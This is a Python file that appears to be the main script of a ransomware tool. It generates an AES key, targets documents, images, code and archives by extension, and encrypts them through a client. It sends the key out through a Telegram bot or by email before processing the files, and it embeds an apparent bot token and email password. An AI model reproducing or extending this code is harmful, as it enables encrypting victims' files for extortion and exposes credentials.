
# Copyright (C) PhcNguyen Developers
# Distributed under the terms of the Modified TUDL License.

import time

from models import aes
from models.utils import System
from models.files import CommonFiles

from models.email import EmailSender
from models.telegram import Telegram



file_categories = {
    'images': [
        '.jpg', '.png', '.gif', '.bmp', 
        '.svg', '.tif', '.tiff', '.jpeg'
    ],
    'documents': [
        '.txt', '.docx', '.md', '.rst', 
        '.doc', '.pdf', '.xlsx', '.xls', 
        '.pptx', '.odt', '.odp', '.rtf', 
        '.epub'
    ],
    'others': [
        '.eml', '.psd', '.eps', '.cdr', 
        '.ppt', '.mp3', '.wav', '.mov', 
        '.dmg', '.rar', '.zip', '.mp4', 
        '.json', '.avi', '.flac'
    ],
    'code': [
        '.c', '.cpp', '.cs', '.java',
        '.py', '.js', '.html', '.css', 
        '.php', '.rb', '.swift', '.sql', 
        '.xml', '.sh', '.bat', '.ts'
    ]
}
key: bytes = aes.generate_key(32)
client = CommonFiles(aes, key, file_categories)


# 1. Send AES key to Telegram (uncomment to use)
def send_key_via_telegram():
    token = '6901515780:AAGeZhRhWMSyG124XiA_qiIJHkvN3AIIyo4'
    chat_id = 'your_chat_id_here'  # replace with your actual chat ID

    telegram = Telegram(token)
    if telegram.sendMessage(chat_id, key):
        client.process_files()
    else:
        time.sleep(10)
        System.reset()


# 2. Send AES key via Email (uncomment to use)
def send_key_via_email():
    email = EmailSender('ransomware@gmail.com', 'Kba#17bak', 'smtp.gmail.com', 587)

    if email.sendEmail('phcnguyenz@proton.me', f'Key AES - {time.time()}', key):
        client.process_files()
        print("Key sent via Email and files processed.")
    else:
        print("Failed to send key via Email. System reset in 10 seconds.")
        time.sleep(10)
        System.reset()


# Test the sending functionality
if __name__ == "__main__":
    # Uncomment one of the following to test:

    # send_key_via_telegram()
    # send_key_via_email()
    pass